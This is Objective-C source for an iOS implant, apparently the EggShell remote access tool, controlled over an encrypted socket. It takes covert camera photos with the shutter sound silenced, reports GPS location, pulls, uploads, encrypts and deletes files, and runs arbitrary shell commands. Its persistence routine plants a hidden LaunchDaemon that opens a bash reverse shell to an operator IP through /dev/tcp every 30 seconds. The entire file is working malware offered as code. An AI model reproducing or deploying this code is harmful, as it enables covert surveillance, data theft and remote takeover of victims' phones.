#import "espl.h"
CFArrayRef SBSCopyApplicationDisplayIdentifiers(bool onlyActive, bool debuggable);

@implementation espl
    
@synthesize recorder;

-(id)init {
    _thisUIDevice = [UIDevice currentDevice];
    [_thisUIDevice setBatteryMonitoringEnabled:YES];
    _fileManager = [[NSFileManager alloc] init];
    _messagingCenter = [CPDistributedMessagingCenter centerNamed:@"com.sysserver"];
    return self;
}

//MARK: Socketry

int sockfd;

-(int)connect:(NSString*)host :(long)port {
    socklen_t len;
    struct sockaddr_in address;
    int result;
    
    sockfd = socket (AF_INET, SOCK_STREAM, 0);
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = inet_addr ([host UTF8String]);
    address.sin_port = htons (port);
    len = sizeof (address);
    result = connect (sockfd, (struct sockaddr *) &address, len);
    
    return result;
}

-(void)sendData:(NSData *)data {
    unsigned char *prepData = (unsigned char *)[data bytes];
    write (sockfd, prepData, sizeof(data));
}

-(void)sendString:(NSString *)string {
    string = [string stringByTrimmingCharactersInSet:[NSCharacterSet controlCharacterSet]];
    NSString *base64String = [[string dataUsingEncoding:NSUTF8StringEncoding] base64EncodedStringWithOptions:0];
    //send string as encrypted base64 string with our generated key from our encrypted argument
    NSString *finalstr = [FBEncryptorAES encryptBase64String:base64String keyString:_skey separateLines:false];
    write (sockfd, [[NSString stringWithFormat:@"%@%@",finalstr,_terminator] UTF8String], finalstr.length + _terminator.length);
}

//MARK: Convenience

-(void)blank {
    [self sendString:@""]; //bang
}

-(NSString *)forgetFirst:(NSArray *)args {
    int x = 1;
    NSString *path = @"";
    for (NSString *tpath in args) {
        if (x != 1) {
            path = [NSString stringWithFormat:@"%@%@ ",path,tpath];
        }
        x++;
    }
    return [path substringToIndex:[path length] - 1];
}

//MARK: Camera

-(void)camera:(BOOL)isfront {
    [_messagingCenter sendMessageName:@"silenceShutter" userInfo:nil];
    [self setupCaptureSession:isfront];
    [NSThread sleepForTimeInterval:0.2];
    //this guy deserves a medal
    //http://stackoverflow.com/questions/22549020/capture-a-still-image-on-ios7-through-a-console-app
    __block BOOL done = NO;
    [self captureWithBlock:^(NSData *imageData) {
        done = YES;
        printf("image data length = %lu\n",(unsigned long)imageData.length);
        [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)imageData.length]];
        [self sendEncryptedFile:imageData];
    }];
    while (!done)
    [[NSRunLoop mainRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.1]];
}

-(AVCaptureDevice *)frontFacingCameraIfAvailable
{
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionFront){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}

-(AVCaptureDevice *)backFacingCameraIfAvailable
{
    NSArray *videoDevices = [AVCaptureDevice devicesWithMediaType:AVMediaTypeVideo];
    AVCaptureDevice *captureDevice = nil;
    for (AVCaptureDevice *device in videoDevices){
        if (device.position == AVCaptureDevicePositionBack){
            captureDevice = device;
            break;
        }
    }
    return captureDevice;
}

- (void)setupCaptureSession:(BOOL)isfront{
    self.session = [[AVCaptureSession alloc] init];
    self.session.sessionPreset = AVCaptureSessionPresetMedium;
    
    AVCaptureDevice *device = nil;
    NSError *error = nil;
    if (isfront)
        device = [self frontFacingCameraIfAvailable];
    else
        device = [self backFacingCameraIfAvailable];
    
    
    AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:device error:&error];

    [self.session addInput:input];
    self.stillImageOutput = [[AVCaptureStillImageOutput alloc] init];
    NSDictionary *outputSettings = [[NSDictionary alloc] initWithObjectsAndKeys: AVVideoCodecJPEG, AVVideoCodecKey, nil];
    [self.stillImageOutput setOutputSettings:outputSettings];
    [outputSettings release];
    [self.session addOutput:self.stillImageOutput];
    [self.session startRunning];
    
}

- (void)captureWithBlock:(void(^)(NSData* imageData))block
{
    AVCaptureConnection* videoConnection = nil;
    for (AVCaptureConnection* connection in self.stillImageOutput.connections)
    {
        for (AVCaptureInputPort* port in [connection inputPorts])
        {
            if ([[port mediaType] isEqual:AVMediaTypeVideo])
            {
                videoConnection = connection;
                break;
            }
        }
        if (videoConnection)
            break;
    }
    [self.stillImageOutput captureStillImageAsynchronouslyFromConnection:videoConnection completionHandler: ^(CMSampleBufferRef imageSampleBuffer, NSError *error)
     {
         NSData* imageData = [AVCaptureStillImageOutput jpegStillImageNSDataRepresentation:imageSampleBuffer];
         block(imageData);
     }];
    [_stillImageOutput release];
    [_session release];
}

//MARK: File Management

-(void)directoryList:(NSArray *)args {
    //basically "ls"
    NSArray *files;
    NSString *dir = [_fileManager currentDirectoryPath];
    if (args.count > 1) {
        dir = [self forgetFirst:args];
    }
    
    NSError *error = nil;
    files = [_fileManager contentsOfDirectoryAtPath:dir error:&error];
    if (error != nil) {
        [self sendString:[NSString stringWithFormat:@"%@",error]];
        return;
    }
    
    NSString *result = @"";
    for (NSString *f in files) {
        result = [result stringByAppendingString:[NSString stringWithFormat:@"%@\n",f]];
    }
    if ([result length] > 0) {
        result = [result substringToIndex:[result length] - 1];
    }
    [self sendString:result];
    //[self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)[result length] ]:skey];
}

-(void)rmFile:(NSArray *)args {
    NSString *file = @"";
    if (args.count > 1) {
        file = [self forgetFirst:args];
    }
    else {
        [self sendString:@"Usage: rm filename"];
        return;
    }
    BOOL isdir = false;
    if ([_fileManager fileExistsAtPath:file isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@: is a directory",file]];
        }
        else {
            [_fileManager removeItemAtPath:file error:NULL];
            [self blank];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",file]];
    }
}

-(void)changeWD:(NSArray *)args {
    //basically "cd"
    NSString *dir = NSHomeDirectory();
    if (args.count > 1) {
        dir = [self forgetFirst:args];
    }
    BOOL isdir = false;
    if ([_fileManager fileExistsAtPath:dir isDirectory:&isdir]) {
        if (isdir) {
            [_fileManager changeCurrentDirectoryPath:dir];
            NSString *blank = @"";
            [self sendString:[NSString stringWithFormat:blank,dir]];
        }
        else {
            [self sendString:[NSString stringWithFormat:@"%@: Not a directory",dir]];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@: No such file or directory",dir]];
    }
}

-(void)sendEncryptedFile:(NSData *)fileData {
    NSString *writeToFileName = @"/tmp/.tmpenc";
    fileData = [fileData AES256EncryptWithKey:_skey];
    [fileData writeToFile:writeToFileName atomically:true];
    
    char bufferin[256];
    FILE *fp;
    fp = fopen([writeToFileName UTF8String], "r");
    /*
     stream file to socket
     some padding will exist but only at the end of the file
     we can handle this server side by removing the offset
     */
    while (!feof(fp))
    {
        unsigned long nRead = fread(bufferin, sizeof(char), 256, fp);
        if (nRead <= 0)
        printf("ERROR reading file\n");
        
        char *pBuf = bufferin;
        while (nRead > 0)
        {
            long nSent = send(sockfd, pBuf, nRead, 0);
            
            if (nSent == -1)
            {
                fd_set writefd;
                FD_ZERO(&writefd);
                FD_SET(sockfd, &writefd);
                
                if (select(0, NULL, &writefd, NULL, NULL) != 1)
                printf("ERROR waiting to write to socket\n");
                continue;
            }
            
            if (nSent == 0)
            printf("DISCONNECTED writing to socket\n");
            
            pBuf += nSent;
            nRead -= nSent;
        }
    }
    //our end send file command
    write(sockfd, [_terminator UTF8String], _terminator.length);
}

-(void)download:(NSArray *)args {
    @autoreleasepool {
        NSString *filepath = @"";
        if (args.count > 1) {
            filepath = [self forgetFirst:args];
        }
        BOOL isdir;
        if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
            if (isdir) {
                [self sendString:@"-2"];
            }
            else {
                NSData *filedata = [_fileManager contentsAtPath:filepath];
                [self sendString:[NSString stringWithFormat:@"%lu",(unsigned long)filedata.length]];
                [self sendEncryptedFile:filedata];
            }
        }
        else {
            [self sendString:@"-1"];
        }
    }
}



-(void)encryptFile:(NSArray *)args {
    BOOL isdir;
    NSString *filepath = @"";
    if (args.count > 2) {
        filepath = [self forgetFirst:args];
        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
    }
    else {
        [self sendString:@"Usage: encrypt file password1234"];
        return;
    }
    
    if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
        }
        else {
            NSData *filedata = [_fileManager contentsAtPath:filepath];
            [self sendString:[NSString stringWithFormat:@"Encrypting %@.aes with 256 Bit AES",filepath]];
            filedata = [filedata AES256EncryptWithKey:args[args.count -1]];
            [filedata writeToFile:[NSString stringWithFormat:@"%@.aes",filepath] atomically:true];
            [_fileManager removeItemAtPath:filepath error:nil];
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
    }
}

-(void)decryptFile:(NSArray *)args {
    BOOL isdir;
    NSString *filepath = @"";
    if (args.count > 2) {
        filepath = [self forgetFirst:args];
        NSString *last = [NSString stringWithFormat:@" %@",args[args.count -1]];
        filepath = [filepath stringByReplacingOccurrencesOfString:last withString:@""];
    }
    else {
        [self sendString:@"Usage: decrypt file.aes password1234"];
        return;
    }
    
    if ([_fileManager fileExistsAtPath:filepath isDirectory:&isdir]) {
        if (isdir) {
            [self sendString:[NSString stringWithFormat:@"%@ is a directory",filepath]];
        }
        else {
            if ([filepath containsString:@".aes"]) {
                NSData *filedata = [_fileManager contentsAtPath:filepath];
                [self sendString:[NSString stringWithFormat:@"Decrypting %@",filepath]];
                filedata = [filedata AES256DecryptWithKey:args[args.count -1]];
                [filedata writeToFile:[filepath substringToIndex:[filepath length] - 4] atomically:true];
                [_fileManager removeItemAtPath:filepath error:nil];
                
            }
            else {
                [self sendString:[NSString stringWithFormat:@"Only supports .aes files"]];
            }
        }
    }
    else {
        [self sendString:[NSString stringWithFormat:@"%@ not found",filepath]];
    }
}

//MARK: Misc

-(void)locate {
    CLLocationManager* manager = [[CLLocationManager alloc] init];
//    manager.delegate = self;
    [manager startUpdatingLocation];
    
    CLLocation *location = [manager location];
    CLLocationCoordinate2D coordinate = [location coordinate];
    NSString *latitude = [NSString stringWithFormat:@"%f", coordinate.latitude];
    NSString *longitude = [NSString stringWithFormat:@"%f", coordinate.longitude];
    NSString *result = [NSString stringWithFormat:@"Latitude : %@\nLongitude : %@\nhttp://maps.google.com/maps?q=%@,%@",latitude,longitude,latitude,longitude];
    if ((int)(coordinate.latitude + coordinate.longitude) == 0) {
        result = @"Unable to get Coordinates\nAre location services enabled?";
    }
    [manager release];
    [self sendString:result];
}

-(void)exec:(NSString *)command {
#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    system([command UTF8String]);
#pragma GCC diagnostic pop
}

-(void)vibrate {
    AudioServicesPlayAlertSound(kSystemSoundID_Vibrate);
    [self blank];
}

-(void)sysinfo {
    uint64_t totalSpace = 0;
    uint64_t totalFreeSpace = 0;
    NSError *error = nil;
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
    NSDictionary *dictionary = [[NSFileManager defaultManager] attributesOfFileSystemForPath:[paths lastObject] error: &error];
    
    if (dictionary) {
        NSNumber *fileSystemSizeInBytes = [dictionary objectForKey: NSFileSystemSize];
        NSNumber *freeFileSystemSizeInBytes = [dictionary objectForKey:NSFileSystemFreeSize];
        totalSpace = [fileSystemSizeInBytes unsignedLongLongValue];
        totalFreeSpace = [freeFileSystemSizeInBytes unsignedLongLongValue];
    }

    NSString *info = [NSString stringWithFormat:@"Model: %@\nSystem Version: %@ %@\nDevice Name: %@\nUUID: %@\n%@",
                      [_thisUIDevice model],
                      [_thisUIDevice systemName],[_thisUIDevice systemVersion],
                      [_thisUIDevice name],
                      [_thisUIDevice identifierForVendor],
                      [self battery]];
    [self sendString:info];
}

-(void)say:(NSString *)string {
    AVSpeechUtterance *utterance = [AVSpeechUtterance speechUtteranceWithString:string];
    utterance.rate = 0.4;
    AVSpeechSynthesizer *syn = [[[AVSpeechSynthesizer alloc] init]autorelease];
    [syn speakUtterance:utterance];
    [self blank];
}

-(void)displayalert:(const char *)title :(const char *)message {
    extern char *optarg;
    extern int optind;
    CFTimeInterval timeout = 0;
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    CFDictionaryAddValue( dict, kCFUserNotificationAlertHeaderKey, CFStringCreateWithCString(NULL, title, kCFStringEncodingUTF8) );
    CFDictionaryAddValue( dict, kCFUserNotificationAlertMessageKey, CFStringCreateWithCString(NULL, message, kCFStringEncodingUTF8) );
    SInt32 error;
    CFOptionFlags flags = 0;
    flags |= kCFUserNotificationPlainAlertLevel;
    CFDictionaryAddValue( dict, kCFUserNotificationAlertTopMostKey, kCFBooleanTrue );
    CFNotificationCenterPostNotificationWithOptions( CFNotificationCenterGetDarwinNotifyCenter(), CFSTR("test"),  NULL, NULL, kCFNotificationDeliverImmediately );
    CFUserNotificationRef notif = CFUserNotificationCreate( NULL, timeout, flags, &error, dict );
    CFOptionFlags options;
    CFUserNotificationReceiveResponse( notif, 0, &options );
    CFUserNotificationGetResponseDictionary(notif);
}

-(void)alert:(NSArray *)cmdarray {
    //our arguments were encoded in base64 so we can have multiple words in multiple arguments
    NSData *titledata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , cmdarray[1]] options:0];
    NSString *titlestring = [[NSString alloc] initWithData:titledata encoding:NSUTF8StringEncoding];
    NSData *messagedata = [[NSData alloc] initWithBase64EncodedString:[NSString stringWithFormat:@"%@" , cmdarray[2]] options:0];
    NSString *messagestring = [[NSString alloc] initWithData:messagedata encoding:NSUTF8StringEncoding];
    //run in background! cool
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        [self displayalert:[titlestring UTF8String]:[messagestring UTF8String]];
    });
    [self sendString:@""];
}

-(void)getPid {
    NSProcessInfo *processInfo = [NSProcessInfo processInfo];
    int processID = [processInfo processIdentifier];
    [self sendString:[NSString stringWithFormat:@"%d",processID]];
}

-(void)openURL:(NSArray *)args {
    if ([args count] > 1) {
        CFURLRef cu = CFURLCreateWithBytes(NULL, (UInt8*)[args[1] UTF8String], strlen([args[1] UTF8String]), kCFStringEncodingUTF8, NULL);
        if(!cu) {
            [self sendString:@"Invalid URL"];
        }
        else {
            bool ret = SBSOpenSensitiveURLAndUnlock(cu, 1);
            if (!ret) {
                [self sendString:[NSString stringWithFormat:@"Error opening url %@",args[1]]];
            }
            else {
                [self blank];
            }
        }
    }
    else {
        [self sendString:@"Usage example: openurl http://google.com"];
    }
}
    
-(void)dial:(NSArray *)args {
    if ([args count] > 1) {
        [self openURL:[NSArray arrayWithObjects:@"", [NSString stringWithFormat:@"tel://%@",args[1]], nil]];
    }
    else {
        [self sendString:@"Usage example: dial 5553334444"];
    }
}

-(void)setVolume:(NSArray *)args {
    if ([args count] > 1) {
        #pragma GCC diagnostic push
        #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
        [[MPMusicPlayerController applicationMusicPlayer]setVolume:[args[1] floatValue]];
        #pragma GCC diagnostic pop
        [self blank];
    }
    else {
        [self sendString:@"Usage example: volume 0.1"];
    }
}

-(void)getVolume {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    [self sendString:[NSString stringWithFormat:@"%.2f",[[MPMusicPlayerController applicationMusicPlayer]volume]]];
    #pragma GCC diagnostic pop
}

-(void)isplaying {
    #pragma GCC diagnostic push
    #pragma GCC diagnostic ignored "-Wdeprecated-declarations"
    float currentpbt = [[MPMusicPlayerController iPodMusicPlayer] currentPlaybackTime];
    [NSThread sleepForTimeInterval:0.1];
    float newcurrentpbt = [[MPMusicPlayerController iPodMusicPlayer] currentPlaybackTime];
    if (currentpbt != newcurrentpbt) {
        [NSThread sleepForTimeInterval:0.1];
        MPMediaItem * song = [[MPMusicPlayerController iPodMusicPlayer] nowPlayingItem];
        NSString * title   = [song valueForProperty:MPMediaItemPropertyTitle];
        NSString * album   = [song valueForProperty:MPMediaItemPropertyAlbumTitle];
        NSString * artist  = [song valueForProperty:MPMediaItemPropertyArtist];
        NSString *mpstatus = [NSString stringWithFormat:@"Currently Playing\nTitle: %@\nAlbum: %@\nArtist: %@\nPlayback time: %f",title,album,artist,newcurrentpbt];
        [self sendString:mpstatus];
    }
    else {
        [self sendString:@"Not Playing"];
    }
    #pragma GCC diagnostic pop
}


-(void)listapps {
    NSString *apps = @"";
    CFArrayRef ary = SBSCopyApplicationDisplayIdentifiers(false, false);
    if (ary != NULL) {
        for(CFIndex i = 0; i < CFArrayGetCount(ary); i++) {
            if (CFArrayGetValueAtIndex(ary, i)) {
                apps = [NSString stringWithFormat:@"%@%@\n",apps,CFArrayGetValueAtIndex(ary, i)];
            }
        }
        [self sendString:apps];
    }
    else {
        [self sendString:@"could not SBSCopyApplicationDisplayIdentifiers"];
    }
}

-(NSString *)battery {
    int batinfo=([_thisUIDevice batteryLevel]*100);
    return [NSString stringWithFormat:@"Battery Level: %d ",batinfo];
}

-(void)launchApp:(NSArray *)args {
    if ([args count] >= 2) {
        int ret;
        CFStringRef identifier = CFStringCreateWithCString(kCFAllocatorDefault, [args[1] UTF8String], kCFStringEncodingUTF8);
        assert(identifier != NULL);
        
        ret = SBSLaunchApplicationWithIdentifier(identifier, FALSE);
        
        if (ret != 0) {
            [self sendString:@"Cannot open app, is device locked?"];
            return;
        }
        
        CFRelease(identifier);
        [self blank];
    }
    else {
        [self sendString:@"Usage: open BundleIdentifier"];
    }
}

-(void)persistence:(NSString *)ip :(int)port {
    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
    if ([_fileManager fileExistsAtPath:loaderpath]) {
        [self sendString:@"Persistence already installed"];
    }
    else {
        NSString *plist = [NSString stringWithFormat:@"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
        <!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\
        <plist version=\"1.0\"><dict><key>Label</key>\
        <string>com.example.touchsomefile</string>\
        <key>ProgramArguments</key>\
        <array><string>bash</string><string>-c</string>\
        <string>bash &gt;&amp; /dev/tcp/%@/%d 0&gt;&amp;1</string>\
        </array><key>RunAtLoad</key><true/>\
        <key>StartInterval</key><integer>30</integer>\
        </dict></plist>",ip,port];
        [plist writeToFile:@"/Library/LaunchDaemons/.esploader.plist"
                atomically:true
                  encoding:NSUTF8StringEncoding
                     error:nil];
        [self exec:[NSString stringWithFormat:@"launchctl load %@",loaderpath]];
        [self sendString:@"Persistence Installed"];
    }
}
-(void)rmpersistence {
    NSString *loaderpath = @"/Library/LaunchDaemons/.esploader.plist";
    if ([_fileManager fileExistsAtPath:loaderpath]) {
        [self exec:[NSString stringWithFormat:@"launchctl unload %@",loaderpath]];
        [_fileManager removeItemAtPath:loaderpath error:NULL];
        [self sendString:@"Persistence removed"];
    }
    else {
        [self sendString:@"Persistence not installed"];
    }
}

//MARK: EggShell Pro

-(void)upload:(int)size :(NSString *)uploadpath {
    long dinc = 0;
    NSString *filedata = @"";
    while(1) {
        char buffer[1024];
        read(sockfd, &buffer, sizeof(buffer));
        filedata = [NSString stringWithFormat:@"%@%s",filedata,buffer];
        dinc += 1024;
        memset(buffer,'\0',1024);
        if (strstr([filedata UTF8String],[_terminator UTF8String])) {
            filedata = [filedata stringByReplacingOccurrencesOfString:_terminator withString:@""];
            break;
        }
    }
    NSData *fdata = [[NSData alloc] initWithBase64EncodedString:filedata options:NSDataBase64DecodingIgnoreUnknownCharacters];
    [fdata writeToFile:uploadpath atomically:true];
}

-(void)mcSendNoReply:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    if ([_messagingCenter sendMessageName:@"commandWithNoReply" userInfo:userInfo]) {
        [self blank];
    }
    else {
        [self sendString:@"You dont have eggshellPro Extension"];
    }
}


-(void)mcSendYesReply:(NSString *)command {
    NSDictionary *userInfo = [NSDictionary dictionaryWithObject:command forKey:@"cmd"];
    NSDictionary *reply = [_messagingCenter sendMessageAndReceiveReplyName:@"commandWithReply" userInfo:userInfo];
    NSString *replystr = [reply objectForKey:@"returnStatus"];
    [self sendString:replystr];
}

-(void)locationService:(NSArray *)args {
    NSString *howto = @"Usage example: locationservice off/locationservice on";
    if ([args count] > 1) {
        if ([args[1] isEqualToString: @"on"]) {
            [self mcSendNoReply:@"locationon"];
        }
        else if ([args[1] isEqualToString: @"off"]) {
            [self mcSendNoReply:@"locationoff"];
        }
        else {
            [self sendString:howto];
        }
    }
    else {
        [self sendString:howto];
    }
}


@end
